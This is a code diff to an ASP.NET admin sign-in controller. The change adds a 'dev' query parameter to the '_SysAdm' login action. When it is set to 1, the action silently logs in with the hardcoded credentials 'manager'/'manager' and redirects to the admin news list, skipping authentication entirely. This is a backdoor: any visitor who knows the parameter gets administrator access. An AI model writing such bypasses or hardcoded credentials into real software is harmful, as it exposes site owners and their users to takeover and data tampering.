@@ -9,8 +9,6 @@ namespace OutWeb.Controllers
 {
     public class SignInController : Controller
     {
-
-
         /// <summary>
         /// 登入頁面
         /// </summary>
@@ -18,8 +16,15 @@ namespace OutWeb.Controllers
         [HttpGet]
         [Route("_SysAdm")]
         [Route("_SysAdm/Index")]
-        public ActionResult Login()
+        public ActionResult Login(int? dev)
         {
+            if (dev.HasValue && dev == 1)
+            {
+                SignInModel model = new SignInModel() { Account = "manager", Password = "manager" };
+                UserProvider.Instance.SignIn(model);
+                return RedirectToAction("NewsList", "_SysAdm", null);
+            }
+
             try
             {
                 if (UserProvider.Instance.User == null)
